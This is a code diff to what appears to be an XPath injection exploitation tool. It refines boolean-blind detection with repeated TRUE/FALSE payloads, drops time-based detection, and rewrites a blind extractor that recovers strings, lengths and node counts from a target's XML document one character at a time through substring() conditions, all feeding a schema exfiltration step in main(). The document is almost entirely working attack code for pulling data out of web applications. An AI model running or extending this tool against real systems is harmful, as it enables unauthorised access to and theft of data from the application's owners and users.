@@ -475,216 +475,204 @@ def detect_boolean(
     inj_candidates: list[str],
 ) -> Optional[InjectionContext]:
     """
-    Detect boolean-blind injection.
-    Looks for parameters where injecting a true condition gives a different
-    response than injecting a false condition.
+    Detect boolean-blind injection with STABLE verification.
+
+    Sends TRUE (1=1) and FALSE (1=2) payloads, checks responses differ
+    consistently across multiple repetitions, then stores HTML length
+    as the primary oracle signal (most reliable, no keyword dependency).
     """
     info("  Trying technique: BOOLEAN-BLIND")
-
-    # A simple condition that is always true / always false in XPath
     TEST_TRUE  = "1=1"
     TEST_FALSE = "1=2"
 
     for param in inj_candidates:
-        baseline, _ = engine.send({})
-        for prefix, null_suffix in BOOL_TEMPLATES:
+        for prefix, _ in BOOL_TEMPLATES:
             true_pay  = prefix.replace("{CONDITION}", TEST_TRUE)
             false_pay = prefix.replace("{CONDITION}", TEST_FALSE)
 
-            true_html,  _ = engine.send({param: true_pay})
-            false_html, _ = engine.send({param: false_pay})
+            # Collect 3 samples each to check stability
+            true_lens:  list[int] = []
+            false_lens: list[int] = []
+            true_htmls: list[str] = []
 
-            if true_html == false_html:
-                continue
+            for _ in range(3):
+                h, _ = engine.send({param: true_pay})
+                true_lens.append(len(h))
+                true_htmls.append(h)
+            for _ in range(3):
+                h, _ = engine.send({param: false_pay})
+                false_lens.append(len(h))
 
-            # Try to figure out which response means "true"
-            # Compare both to baseline
-            true_like_baseline  = _html_similarity(true_html,  baseline) > 0.85
-            false_like_baseline = _html_similarity(false_html, baseline) > 0.85
+            avg_true  = sum(true_lens)  / len(true_lens)
+            avg_false = sum(false_lens) / len(false_lens)
+            len_diff  = abs(avg_true - avg_false)
 
             debug(
                 f"    {param!r} tpl={prefix[:30]!r} "
-                f"true~base={true_like_baseline} false~base={false_like_baseline}"
+                f"avg_true={avg_true:.0f} avg_false={avg_false:.0f} diff={len_diff:.0f}"
             )
 
-            # True response should differ from false response, and one should
-            # have a success-like marker
-            true_success  = _seems_data(true_html)  or not _seems_empty(true_html)
-            false_success = _seems_data(false_html) or not _seems_empty(false_html)
+            # Need at least 10 char difference AND stable (max variance < 30 chars)
+            true_variance  = max(true_lens)  - min(true_lens)
+            false_variance = max(false_lens) - min(false_lens)
+            if len_diff < 10 or true_variance > 30 or false_variance > 30:
+                debug(f"    → not stable enough, skip")
+                continue
 
-            if true_success and not false_success:
-                # Find distinguishing markers
-                true_marker, false_marker = _find_bool_markers(true_html, false_html)
-                success(
-                    f"  [BOOLEAN] inj='{param}' "
-                    f"prefix={prefix[:40]!r} "
-                    f"marker='{true_marker[:30]}'"
+            # Make sure true_html is the LONGER (data) response
+            true_html  = true_htmls[0]
+            false_html = ""
+            # Get one false sample for marker extraction
+            false_html, _ = engine.send({param: false_pay})
+
+            if avg_true < avg_false:
+                # Swap: false is longer, which means our "true" logic is inverted
+                # This can happen if "user not found" page is larger
+                # Re-check with keyword heuristics
+                has_success_true = any(
+                    k in true_html.lower()
+                    for k in ["success", "sent", "valid", "welcome", "found", "ok"]
                 )
-                return InjectionContext(
-                    technique="boolean",
-                    inj_param=param,
-                    null_payload=false_pay,
-                    true_payload=true_pay,
-                    true_marker=true_marker,
-                    false_marker=false_marker,
-                    wrap_prefix=prefix.split("{CONDITION}")[0],
-                    wrap_suffix=prefix.split("{CONDITION}")[1],
-                )
+                if not has_success_true:
+                    # Swap true/false payloads
+                    true_pay, false_pay = false_pay, true_pay
+                    true_html, false_html = false_html, true_html
+                    avg_true, avg_false   = avg_false, avg_true
+
+            # Find the distinguishing text marker (keyword in true but not false)
+            true_marker, false_marker = _find_bool_markers(true_html, false_html)
+
+            # Verify the marker actually works as oracle
+            # Send known-false, check marker absent
+            check_false, _ = engine.send({param: false_pay})
+            marker_reliable = (
+                true_marker != "TRUE_RESPONSE" and
+                true_marker in true_html and
+                true_marker not in check_false
+            )
+
+            success(
+                f"  [BOOLEAN] inj='{param}' tpl={prefix[:35]!r}\n"
+                f"           true_len={avg_true:.0f}  false_len={avg_false:.0f}\n"
+                f"           marker={true_marker[:50]!r}  reliable={marker_reliable}"
+            )
+
+            ctx = InjectionContext(
+                technique="boolean",
+                inj_param=param,
+                null_payload=false_pay,
+                true_payload=true_pay,
+                true_marker=true_marker if marker_reliable else "",
+                false_marker=false_marker,
+                wrap_prefix=prefix.split("{CONDITION}")[0],
+                wrap_suffix=prefix.split("{CONDITION}")[1],
+            )
+            # Store expected lengths for length-based oracle fallback
+            ctx._true_avg_len  = avg_true
+            ctx._false_avg_len = avg_false
+            ctx._len_threshold = (avg_true + avg_false) / 2
+            return ctx
 
     return None
 
 
 def _html_similarity(a: str, b: str) -> float:
-    """Quick similarity ratio between two HTML strings."""
     if not a and not b:
         return 1.0
     return difflib.SequenceMatcher(None, a[:2000], b[:2000]).ratio()
 
 
 def _find_bool_markers(true_html: str, false_html: str) -> tuple[str, str]:
-    """Extract short distinguishing text snippets from true/false responses."""
-    # Look for text-level differences
+    """Find shortest unique substring in true_html not present in false_html."""
+    # Try known success/failure keywords first
+    SUCCESS_KW = ["successfully sent", "message sent", "welcome", "success",
+                  "valid user", "logged in", "found"]
+    FAILURE_KW = ["does not exist", "invalid", "not found", "error", "fail",
+                  "no result", "incorrect"]
+    true_low  = true_html.lower()
+    false_low = false_html.lower()
+    for kw in SUCCESS_KW:
+        if kw in true_low and kw not in false_low:
+            return kw, ""
+    for kw in FAILURE_KW:
+        if kw in false_low and kw not in true_low:
+            return "", kw
+
+    # Fallback: word-level diff
     true_words  = set(re.sub(r"<[^>]+>", " ", true_html).split())
     false_words = set(re.sub(r"<[^>]+>", " ", false_html).split())
-    only_true   = " ".join(list(true_words  - false_words)[:5])
-    only_false  = " ".join(list(false_words - true_words)[:5])
+    only_true   = " ".join(list(true_words  - false_words)[:3])
+    only_false  = " ".join(list(false_words - true_words)[:3])
     return only_true or "TRUE_RESPONSE", only_false or "FALSE_RESPONSE"
 
 
-# ── Time-based detection ──────────────────────────────────────────────────────
-
-def detect_time_based(
-    engine: Engine,
-    inj_candidates: list[str],
-    samples: int = 5,
-) -> Optional[InjectionContext]:
-    """
-    Detect time-based blind injection.
-    Measures response time with TRUE condition (triggers TIME_BOMB) vs FALSE.
-    """
-    info("  Trying technique: TIME-BASED")
-
-    TEST_TRUE  = "1=1"
-    TEST_FALSE = "1=2"
-
-    for param in inj_candidates:
-        for prefix, _ in BOOL_TEMPLATES:
-            true_pay  = prefix.replace("{CONDITION}", f"{TEST_TRUE} and {TIME_BOMB}>0")
-            false_pay = prefix.replace("{CONDITION}", TEST_FALSE)
-
-            # Collect timing samples
-            true_times:  list[float] = []
-            false_times: list[float] = []
-
-            info(f"    Timing param='{param}' template={prefix[:30]!r} ...")
-            for _ in range(samples):
-                _, t = engine.send({param: true_pay})
-                true_times.append(t)
-            for _ in range(samples):
-                _, t = engine.send({param: false_pay})
-                false_times.append(t)
-
-            avg_true  = statistics.mean(true_times)
-            avg_false = statistics.mean(false_times)
-            debug(f"    avg_true={avg_true:.3f}s  avg_false={avg_false:.3f}s")
-
-            # TRUE responses should be significantly slower
-            if avg_true > avg_false * 2.5 and avg_true > avg_false + 0.3:
-                threshold = (avg_true + avg_false) / 2
-                success(
-                    f"  [TIME-BASED] inj='{param}' "
-                    f"true={avg_true:.2f}s false={avg_false:.2f}s "
-                    f"threshold={threshold:.2f}s"
-                )
-                return InjectionContext(
-                    technique="time",
-                    inj_param=param,
-                    null_payload=false_pay,
-                    true_payload=true_pay,
-                    time_threshold=threshold,
-                    wrap_prefix=prefix.split("{CONDITION}")[0],
-                    wrap_suffix=prefix.split("{CONDITION}")[1],
-                )
-
-    return None
-
-
-# ── Auto-detect: try all techniques in order ──────────────────────────────────
-
-def auto_detect_technique(
-    engine: Engine,
-    all_params: list[str],
-    force_technique: Optional[str] = None,
-) -> Optional[InjectionContext]:
-    """
-    Try techniques in order: normal → boolean → time-based.
-    Return the first that works.
-    """
-    techniques = ["normal", "boolean", "time"] if not force_technique else [force_technique]
-    info(f"Auto-detecting injection technique (order: {' → '.join(techniques)})")
-    print()
-
-    for tech in techniques:
-        ctx = None
-        if tech == "normal":
-            ctx = detect_normal(engine, all_params, all_params)
-        elif tech == "boolean":
-            ctx = detect_boolean(engine, all_params)
-        elif tech == "time":
-            ctx = detect_time_based(engine, all_params)
-
-        if ctx:
-            print()
-            success(f"Confirmed technique: {C.BOLD}{ctx.technique.upper()}{C.RESET}")
-            return ctx
-        print()
-
-    return None
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# BOOLEAN / TIME ORACLE
-# The single interface for asking true/false questions about the XML document
-# ──────────────────────────────────────────────────────────────────────────────
-
 class Oracle:
     """
-    Asks a yes/no question via an XPath condition.
-    Works for both boolean-blind and time-based modes.
+    Asks a true/false question about the XML document via injection.
+
+    For boolean mode uses THREE signals in priority order:
+      1. Keyword marker in HTML (most reliable when found)
+      2. Response length vs stored threshold (avg_true vs avg_false)
+      3. HTML similarity to known-true response
+
+    For time mode: compares elapsed time to threshold.
     """
     def __init__(self, engine: Engine, ctx: InjectionContext):
-        self.engine = engine
-        self.ctx    = ctx
+        self.engine     = engine
+        self.ctx        = ctx
+        self._true_html: Optional[str] = None  # cached on first use
 
     def ask(self, xpath_condition: str) -> bool:
-        """Return True if xpath_condition evaluates to true in the XML doc."""
+        """Return True if xpath_condition is true in the XML document."""
         payload = f"{self.ctx.wrap_prefix}{xpath_condition}{self.ctx.wrap_suffix}"
+        debug(f"  ASK: {xpath_condition[:80]}")
 
         if self.ctx.technique == "boolean":
             html, _ = self.engine.send({self.ctx.inj_param: payload})
-            if self.ctx.true_marker and self.ctx.true_marker in html:
-                return True
-            if self.ctx.false_marker and self.ctx.false_marker in html:
-                return False
-            # Fallback: compare to known true/false responses
-            true_html,  _ = self.engine.send({self.ctx.inj_param: self.ctx.true_payload})
-            sim_true  = _html_similarity(html, true_html)
-            return sim_true > 0.8
+
+            # Signal 1: keyword marker (fastest, most reliable)
+            if self.ctx.true_marker:
+                if self.ctx.true_marker in html:
+                    return True
+                if self.ctx.false_marker and self.ctx.false_marker in html:
+                    return False
+
+            # Signal 2: length threshold
+            if hasattr(self.ctx, "_len_threshold"):
+                result = len(html) > self.ctx._len_threshold
+                debug(f"    len={len(html)} threshold={self.ctx._len_threshold:.0f} → {result}")
+                return result
+
+            # Signal 3: similarity to known-true HTML
+            if self._true_html is None:
+                self._true_html, _ = self.engine.send(
+                    {self.ctx.inj_param: self.ctx.true_payload}
+                )
+            sim = _html_similarity(html, self._true_html)
+            return sim > 0.85
 
         elif self.ctx.technique == "time":
-            # Wrap: TRUE condition triggers TIME_BOMB
-            true_pay  = (f"{self.ctx.wrap_prefix}"
-                         f"({xpath_condition}) and {TIME_BOMB}>0"
-                         f"{self.ctx.wrap_suffix}")
-            false_pay = (f"{self.ctx.wrap_prefix}"
-                         f"1=2"
-                         f"{self.ctx.wrap_suffix}")
-            _, t_true  = self.engine.send({self.ctx.inj_param: true_pay})
-            _, t_false = self.engine.send({self.ctx.inj_param: false_pay})
-            debug(f"    oracle time: true={t_true:.3f}s  false={t_false:.3f}s  threshold={self.ctx.time_threshold:.3f}s")
-            return t_true > self.ctx.time_threshold
+            bomb_pay = (
+                f"{self.ctx.wrap_prefix}"
+                f"({xpath_condition}) and {TIME_BOMB}>0"
+                f"{self.ctx.wrap_suffix}"
+            )
+            _, t = self.engine.send({self.ctx.inj_param: bomb_pay})
+            debug(f"    time={t:.3f}s threshold={self.ctx.time_threshold:.3f}s")
+            return t > self.ctx.time_threshold
 
         return False
+
+    def verify(self) -> bool:
+        """Quick sanity check: true=1 should return True, false=0 should return False."""
+        t = self.ask("1=1")
+        f = self.ask("1=2")
+        ok = t and not f
+        if not ok:
+            warn(f"Oracle sanity check FAILED: ask(1=1)={t} ask(1=2)={f}")
+        else:
+            success(f"Oracle sanity check OK: ask(1=1)=True ask(1=2)=False")
+        return ok
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -693,17 +681,56 @@ class Oracle:
 
 class BlindExtractor:
     """
-    Extracts strings and integers from XML via boolean/time oracle.
-    Uses binary search where possible to minimize requests.
+    Extracts strings and numbers via the Oracle.
+
+    XPath 1.0 only — no string-to-codepoints (that is XPath 2.0).
+
+    Integer extraction:
+      Uses EXACT MATCH:  expr=N  (linear, starting from 1)
+      with early-stop once oracle returns False.
+      Fast enough for lengths <= 100.
+
+    Char extraction:
+      Pure XPath 1.0:  substring(expr, pos, 1)='x'
+      Linear scan through CHARSET in frequency order.
+      With threading: each position searched in parallel.
     """
+
+    # Most common chars first → fewer requests on average
+    CHARSET = (
+        "etaoinshrdlcumwfgypbvkjxqz"  # lowercase freq order
+        "ETAOINSHRDLCUMWFGYPBVKJXQZ"
+        "0123456789"
+        "_-. @!#$%^&*()+=[]{}'|;:,<>?/"
+    )
+
     def __init__(self, oracle: Oracle, threads: int = 1):
         self.oracle  = oracle
         self.threads = threads
 
-    # ── Integer extraction (binary search) ────────────────────────────────────
+    # ── Verify oracle before starting ─────────────────────────────────────────
 
-    def get_int(self, xpath_expr: str, lo: int = 0, hi: int = 200) -> int:
-        """Binary-search the integer value of an XPath numeric expression."""
+    def verify_oracle(self) -> bool:
+        return self.oracle.verify()
+
+    # ── Integer: exact match (XPath 1.0 safe) ─────────────────────────────────
+
+    def get_int(self, xpath_expr: str, max_val: int = 100) -> int:
+        """
+        Find integer value via equality test: expr=1, expr=2, ...
+        Returns 0 if not found within max_val.
+        """
+        for n in range(0, max_val + 1):
+            if self.oracle.ask(f"({xpath_expr})={n}"):
+                return n
+        return 0
+
+    def get_int_fast(self, xpath_expr: str, max_val: int = 100) -> int:
+        """
+        Binary search variant — only use when oracle is very reliable.
+        Finds N such that expr <= N by bisecting.
+        """
+        lo, hi = 0, max_val
         while lo < hi:
             mid = (lo + hi) // 2
             if self.oracle.ask(f"({xpath_expr}) > {mid}"):
@@ -714,60 +741,70 @@ class BlindExtractor:
 
     # ── String length ──────────────────────────────────────────────────────────
 
-    def get_length(self, xpath_expr: str) -> int:
-        return self.get_int(f"string-length({xpath_expr})", lo=0, hi=500)
+    def get_length(self, xpath_expr: str, max_len: int = 200) -> int:
+        """Get string length via exact equality test."""
+        return self.get_int(f"string-length({xpath_expr})", max_val=max_len)
 
-    # ── Single character at position ──────────────────────────────────────────
+    # ── Single character ───────────────────────────────────────────────────────
 
     def get_char(self, xpath_expr: str, pos: int) -> str:
-        """Binary-search the ASCII code of char at position pos."""
-        code = self.get_int(
-            f"string-to-codepoints(substring({xpath_expr},{pos},1))",
-            lo=0, hi=127,
-        )
-        if code > 0:
-            return chr(code)
-
-        # Fallback: linear search through charset
-        for ch in CHARSET:
-            if self.oracle.ask(f"substring({xpath_expr},{pos},1)='{ch}'"):
+        """
+        Get character at position pos via substring(expr, pos, 1)='x'.
+        XPath 1.0 compatible. Linear scan through CHARSET.
+        """
+        for ch in self.CHARSET:
+            # Escape single quotes in char (rare but possible)
+            ch_escaped = ch if ch != "'" else '"' + ch + '"'
+            cond = f"substring({xpath_expr},{pos},1)='{ch_escaped}'"
+            if self.oracle.ask(cond):
                 return ch
         return "?"
 
     # ── Full string ───────────────────────────────────────────────────────────
 
     def get_string(self, xpath_expr: str, known_length: Optional[int] = None) -> str:
-        length = known_length if known_length is not None else self.get_length(xpath_expr)
+        length = known_length
+        if length is None:
+            length = self.get_length(xpath_expr)
         if length == 0:
             return ""
 
+        info(f"    Extracting {length} chars from {xpath_expr}")
         result = ["?"] * length
 
         if self.threads > 1:
             lock = Lock()
-            def fetch_char(pos):
+            extracted = [0]
+
+            def fetch_char(pos: int):
                 ch = self.get_char(xpath_expr, pos)
                 with lock:
                     result[pos - 1] = ch
-                    debug(f"    char[{pos}] = {ch!r}")
-                return pos, ch
+                    extracted[0]   += 1
+                    partial = "".join(result)
+                    # Print progress on same line
+                    print(f"\r    [{extracted[0]:>3}/{length}] {partial}", end="", flush=True)
+                return ch
 
             with ThreadPoolExecutor(max_workers=self.threads) as ex:
                 futures = {ex.submit(fetch_char, i): i for i in range(1, length + 1)}
                 for f in as_completed(futures):
                     f.result()
+            print()  # newline after progress
         else:
             for pos in range(1, length + 1):
                 ch = self.get_char(xpath_expr, pos)
                 result[pos - 1] = ch
-                debug(f"    char[{pos}] = {ch!r}")
+                partial = "".join(result)
+                print(f"\r    [{pos:>3}/{length}] {partial}", end="", flush=True)
+            print()
 
         return "".join(result)
 
-    # ── Count children ────────────────────────────────────────────────────────
+    # ── Count ──────────────────────────────────────────────────────────────────
 
-    def get_count(self, xpath_expr: str) -> int:
-        return self.get_int(f"count({xpath_expr})", lo=0, hi=100)
+    def get_count(self, xpath_expr: str, max_count: int = 50) -> int:
+        return self.get_int(f"count({xpath_expr})", max_val=max_count)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -1387,6 +1424,11 @@ def main():
     elif ctx.technique in ("boolean", "time"):
         oracle    = Oracle(engine, ctx)
         bextract  = BlindExtractor(oracle, threads=args.threads)
+
+        # Verify oracle before starting
+        info("Verifying oracle reliability...")
+        if not bextract.verify_oracle():
+            warn("Oracle unreliable — results may be wrong. Try -v to debug.")
 
         # Schema exfiltration
         schema = blind_exfiltrate_schema(bextract, max_depth=args.max_depth)
